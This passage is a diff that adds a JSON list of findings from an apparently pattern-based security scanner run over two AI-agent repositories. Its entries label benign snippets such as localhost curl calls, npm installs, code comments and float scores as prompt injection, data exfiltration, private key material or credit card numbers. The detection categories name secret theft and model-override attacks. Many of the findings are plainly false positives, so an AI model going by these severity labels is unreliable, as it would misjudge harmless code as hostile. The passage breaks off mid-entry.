@@ -1,0 +1,4439 @@
+[
+ {
+  "repo": "es617__claude-replay",
+  "file": ".github/workflows/cicd.yml",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 121,
+  "ctx": "- run: npm install -g npm@latest"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": ".github/workflows/format-check.yml",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 30,
+  "ctx": "run: npm install -g @anthropic-ai/claude-code@l..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": ".github/workflows/format-check.yml",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 34,
+  "ctx": "run: npm install -g @openai/codex@latest"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": ".github/workflows/format-check.yml",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 52,
+  "ctx": "CLAUDE_SESSION=$(find ~/.claude/projects -name \"*.j..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": ".github/workflows/format-check.yml",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 69,
+  "ctx": "CODEX_SESSION=$(find ~/.codex/sessions -name \"*.js..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": ".github/workflows/format-check.yml",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 86,
+  "ctx": "CURSOR_SESSION=$(find ~/.cursor/projects -name \"*.j..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "CHANGELOG.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 109,
+  "ctx": "... flag for editor server (use `0.0.0.0` for Docker/container access)"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "Dockerfile",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 3,
+  "ctx": "RUN npm install -g claude-replay"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "docs/demo-redaction.html",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 135,
+  "ctx": "...e(/#.*/,\"\")+\"#turn=\"+e;window.open(n,\"_blank\")})),window.addEventLi..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "docs/demo-session.jsonl",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 1,
+  "ctx": "...e\":\"Bash\",\"input\":{\"command\":\"curl http://localhost:3000\",\"description\":\"Test the..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "docs/demo-session.jsonl",
+  "category": "Shell Injection",
+  "pattern": "Backtick Command Substitution",
+  "severity": "Severity.MEDIUM",
+  "line": 1,
+  "ctx": "...00, and verified working with `curl`. The server has been stopped...."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "docs/demo-session.jsonl",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 2,
+  "ctx": "...e\":\"Bash\",\"input\":{\"command\":\"curl -s http://localhost:3000/health\"},\"result\":\"{\\\"st..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "docs/demo.html",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 163,
+  "ctx": "...e(/#.*/,\"\")+\"#turn=\"+e;window.open(n,\"_blank\")})),window.addEventLi..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "docs/index.html",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 1823,
+  "ctx": "// Env var patterns (PASSWORD=..., TOKEN=..., etc.)"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "docs/index.html",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 2013,
+  "ctx": "....*/,\\\"\\\")+\\\"#turn=\\\"+e;window.open(n,\\\"_blank\\\")})),window.addEvent..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "docs/index.html",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 2014,
+  "ctx": "...sh\\\",\\\"input\\\":{\\\"command\\\":\\\"curl http://localhost:3000\\\",\\\"description\\\":\\\"Test..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "docs/index.html",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 2014,
+  "ctx": "...sh\\\",\\\"input\\\":{\\\"command\\\":\\\"curl -s http://localhost:3000/health\\\"},\\\"result\\\":\\\"{..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "docs/index.html",
+  "category": "Shell Injection",
+  "pattern": "Backtick Command Substitution",
+  "severity": "Severity.MEDIUM",
+  "line": 2014,
+  "ctx": "...00, and verified working with `curl`. The server has been stopped...."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "docs/index.html",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 2137,
+  "ctx": "$(id).addEventListener(\"change\", s..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "README.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 84,
+  "ctx": "Open http://localhost:7331 for the web editor. Sess..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "README.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 192,
+  "ctx": "...ditor runs a local server on `127.0.0.1` (localhost only, not exposed..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 27,
+  "ctx": "{ pattern: \"/*THEME_CSS*/\", token: \"__PLACEHOLDER_THEME_CSS__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 32,
+  "ctx": "{ pattern: \"/*INITIAL_SPEED*/1\", token: \"__PLACEHOLDER_INITIAL_SPEED_VAL__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 33,
+  "ctx": "{ pattern: \"/*INITIAL_SPEED*/\", token: \"__PLACEHOLDER_INITIAL_SPEED__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 34,
+  "ctx": "{ pattern: \"/*CHECKED_THINKING*/\", token: \"__PLACEHOLDER_CHECKED_THINKING__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 35,
+  "ctx": "{ pattern: \"/*CHECKED_TOOLS*/\", token: \"__PLACEHOLDER_CHECKED_TOOLS__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 36,
+  "ctx": "{ pattern: \"/*THEME_BG*/\", token: \"__PLACEHOLDER_THEME_BG__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 37,
+  "ctx": "{ pattern: \"/*PAGE_TITLE*/\", token: \"__PLACEHOLDER_PAGE_TITLE__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 38,
+  "ctx": "{ pattern: \"/*USER_LABEL*/\", token: \"__PLACEHOLDER_USER_LABEL__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 39,
+  "ctx": "{ pattern: \"/*ASSISTANT_LABEL*/\", token: \"__PLACEHOLDER_ASSISTANT_LABEL__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 40,
+  "ctx": "{ pattern: \"/*PAGE_DESCRIPTION*/\", token: \"__PLACEHOLDER_PAGE_DESCRIPTION__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 41,
+  "ctx": "{ pattern: \"/*OG_IMAGE*/\", token: \"__PLACEHOLDER_OG_IMAGE__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 42,
+  "ctx": "{ pattern: \"/*HAS_REAL_TIMESTAMPS*/false\", token: \"__PLACEHOLDER_HAS_REAL_TIMESTAMPS__false\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 43,
+  "ctx": "{ pattern: \"/*PACED_WORDING*/false\", token: \"__PLACEHOLDER_PACED_WORDING__false\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 44,
+  "ctx": "{ pattern: READING_WPM_TEMPLATE_PLACEHOLDER, token: \"__PLACEHOLDER_READING_WPM_VALUE__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 45,
+  "ctx": "{ pattern: PACED_WORDING_TUNING_TEMPLATE_PLACEHOLDER, token: \"__PLACEHOLDER_PACED_WORDING_TUNING__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-template.mjs",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 46,
+  "ctx": "{ pattern: \"/*FONT_SIZE*/13px\", token: \"__PLACEHOLDER_FONT_SIZE__\" },"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-website.mjs",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 178,
+  "ctx": "<code>npm install -g claude-replay</code>"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-website.mjs",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 343,
+  "ctx": "...avigator.clipboard.writeText(\"npm install -g claude-replay\").then(() => ..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "scripts/build-website.mjs",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 379,
+  "ctx": "$(id).addEventListener(\"change\", s..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "src/editor-server.mjs",
+  "category": "Prompt Injection",
+  "pattern": "Forget/Reset Override",
+  "severity": "Severity.HIGH",
+  "line": 30,
+  "ctx": "* Create a new session, restoring from autosave if a..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "src/editor-server.mjs",
+  "category": "Prompt Injection",
+  "pattern": "Forget/Reset Override",
+  "severity": "Severity.HIGH",
+  "line": 688,
+  "ctx": "// New session"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "src/editor-server.mjs",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 822,
+  "ctx": "... function startEditor(port, { open = true, host = \"127.0.0.1\", initialFile, noOriginCheck ..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "src/extract.mjs",
+  "category": "Prompt Injection",
+  "pattern": "Steganographic Output Control",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "...b — either raw JSON or base64-encoded deflate. * For raw JSON (--no-compress mode), undoes the JS string literal escaping * applied by escapeJsonForScript be"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "src/formats/opencode.mjs",
+  "category": "Prompt Injection",
+  "pattern": "Steganographic Output Control",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "/** * OpenCode JSONL format parser. * * Format: JSONL with step_start/step_finish boundaries, tool_use, text, and reasoning events. * Each step is grouped into "
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "src/secrets.mjs",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 41,
+  "ctx": "// Env var patterns (PASSWORD=..., TOKEN=..., etc.)"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "src/secrets.mjs",
+  "category": "Prompt Injection",
+  "pattern": "Backwards/Encoded Output Request",
+  "severity": "Severity.HIGH",
+  "line": 47,
+  "ctx": "// Standalone hex tokens (40+ hex chars, word-bounded..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "template/player.html",
+  "category": "Prompt Injection",
+  "pattern": "Encoded Bypass (Base64 hint)",
+  "severity": "Severity.HIGH",
+  "line": 1172,
+  "ctx": "...Decode embedded data: deflate+base64 (compressed) or raw JSON string."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "template/player.html",
+  "category": "Prompt Injection",
+  "pattern": "Encoded Bypass (Base64 hint)",
+  "severity": "Severity.HIGH",
+  "line": 1185,
+  "ctx": "...const bytes = Uint8Array.from(atob(raw), c => c.charCodeAt(0));"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "template/player.html",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 3061,
+  "ctx": "window.open(url, \"_blank\");"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/AGENT-SMOKE-TEST.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 150,
+  "ctx": "curl -s http://127.0.0.1:17999/api/sessions | node -e ..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/AGENT-SMOKE-TEST.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 150,
+  "ctx": "curl -s http://127.0.0.1:17999/api/sessions | node -e ..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/AGENT-SMOKE-TEST.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 151,
+  "ctx": "curl -s http://127.0.0.1:17999/api/themes | node -e \"c..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/AGENT-SMOKE-TEST.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 151,
+  "ctx": "curl -s http://127.0.0.1:17999/api/themes | node -e \"c..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/AGENT-SMOKE-TEST.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 154,
+  "ctx": "curl -s -X POST http://127.0.0.1:17999/api/load -H 'Content-Ty..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/AGENT-SMOKE-TEST.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 154,
+  "ctx": "curl -s -X POST http://127.0.0.1:17999/api/load -H 'Content-Ty..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/AGENT-SMOKE-TEST.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 183,
+  "ctx": "curl -s http://127.0.0.1:17998 | head -1"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/AGENT-SMOKE-TEST.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 183,
+  "ctx": "curl -s http://127.0.0.1:17998 | head -1"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/AGENT-SMOKE-TEST.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 187,
+  "ctx": "curl -s http://127.0.0.1:17998/__reload"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/AGENT-SMOKE-TEST.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 187,
+  "ctx": "curl -s http://127.0.0.1:17998/__reload"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/fixture-opencode.jsonl",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2,
+  "ctx": "{\"type\":\"tool_use\",\"timestamp\":1774712787908,\"s..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/fixture-opencode.jsonl",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 5,
+  "ctx": "{\"type\":\"tool_use\",\"timestamp\":1774712790424,\"s..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/fixture-opencode.jsonl",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 9,
+  "ctx": "...umber is **55**.\",\"time\":{\"start\":1774712792663,\"end\":1774712792663}}}"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/test-editor-server.mjs",
+  "category": "Prompt Injection",
+  "pattern": "Forget/Reset Override",
+  "severity": "Severity.HIGH",
+  "line": 478,
+  "ctx": "// Force a new session by clearing in-memory cache —..."
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/test-secrets.mjs",
+  "category": "Data Exfiltration",
+  "pattern": "Private Key Material",
+  "severity": "Severity.CRITICAL",
+  "line": 77,
+  "ctx": "const pem = `-----BEGIN RSA PRIVATE KEY-----"
+ },
+ {
+  "repo": "es617__claude-replay",
+  "file": "test/test-secrets.mjs",
+  "category": "Prompt Injection",
+  "pattern": "Backwards/Encoded Output Request",
+  "severity": "Severity.HIGH",
+  "line": 83,
+  "ctx": "it(\"redacts long hex tokens\", () => {"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": ".github/ISSUE_TEMPLATE/bug_report.yml",
+  "category": "Prompt Injection",
+  "pattern": "Steganographic Output Control",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "...OpenAI Codex CLI - Cursor - OpenCode - Antigravity CLI - Pi - Multiple harnesses - Adapter framework / tooling (not a specific harness) validations: required"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": ".github/ISSUE_TEMPLATE/new_subagent.yml",
+  "category": "Prompt Injection",
+  "pattern": "Steganographic Output Control",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "...de Code, Codex CLI, Cursor, OpenCode, the Antigravity CLI, and Pi. **Important**: Only propose components for legitimate, constructive use cases. Proposals f"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": ".github/workflows/claude-code-review.yml",
+  "category": "Social Engineering",
+  "pattern": "Approval Bypass (LLM08)",
+  "severity": "Severity.HIGH",
+  "line": 173,
+  "ctx": "- Don't ask for extra documentation unles..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": ".github/workflows/claude.yml",
+  "category": "Shell Injection",
+  "pattern": "Backtick Command Substitution",
+  "severity": "Severity.MEDIUM",
+  "line": 25,
+  "ctx": "# under the `make`/`uv`/`python` allowlist below in a job that..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": ".github/workflows/validate.yml",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 56,
+  "ctx": "with open('.claude-plugin/marketplace.jso..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": ".github/workflows/validate.yml",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 281,
+  "ctx": "run: npm install -g --ignore-scripts @earendil-..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": ".gitignore",
+  "category": "Agentic Security",
+  "pattern": "Exception Swallowing (ASI08)",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "...and-edit generated files. # # EXCEPTION — small registries committed so Codex + Cursor install natively from a clone # (no build step). They point at the sou"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": ".gitignore",
+  "category": "Shell Injection",
+  "pattern": "Backtick Command Substitution",
+  "severity": "Severity.MEDIUM",
+  "line": 63,
+  "ctx": "# Pi — transformed skills/prompts/agents (local generatio..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "docs/round-trip-results.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 94,
+  "ctx": "...ort ANTHROPIC_BASE_URL=http://127.0.0.1:1"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 6,
+  "ctx": "\"static_score\": 0.7680997613365156,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 44,
+  "ctx": "\"token_efficiency\": 0.9820224719101124"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 134,
+  "ctx": "\"token_efficiency\": 0.9733333333333334"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 144,
+  "ctx": "...     \"frontmatter_quality\": 0.5599999999999999,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 194,
+  "ctx": "\"token_efficiency\": 0.9475409836065574"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 254,
+  "ctx": "\"token_efficiency\": 0.9944444444444445"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 281,
+  "ctx": "...    \"orchestration_wiring\": 0.5499999999999999,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 294,
+  "ctx": "...     \"frontmatter_quality\": 0.5599999999999999,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 329,
+  "ctx": "\"token_efficiency\": 0.9244444444444444"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 389,
+  "ctx": "\"token_efficiency\": 0.9879518072289156"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 409,
+  "ctx": "\"composite\": 73.4090909090909,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 456,
+  "ctx": "\"static_score\": 0.7236285714285714,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 464,
+  "ctx": "\"token_efficiency\": 0.8714285714285714"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 509,
+  "ctx": "\"token_efficiency\": 0.9382978723404255"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 561,
+  "ctx": "\"static_score\": 0.6991627906976744,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 599,
+  "ctx": "\"token_efficiency\": 0.9095477386934674"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 689,
+  "ctx": "\"token_efficiency\": 0.9733333333333334"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 696,
+  "ctx": "\"static_score\": 0.6831718309859155,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 704,
+  "ctx": "\"token_efficiency\": 0.9774647887323944"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 814,
+  "ctx": "\"composite\": 69.3809523809524,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 861,
+  "ctx": "\"static_score\": 0.726920245398773,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 924,
+  "ctx": "...     \"frontmatter_quality\": 0.5599999999999999,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 981,
+  "ctx": "\"static_score\": 0.7397342465753425,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 989,
+  "ctx": "\"token_efficiency\": 0.9726027397260274"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1029,
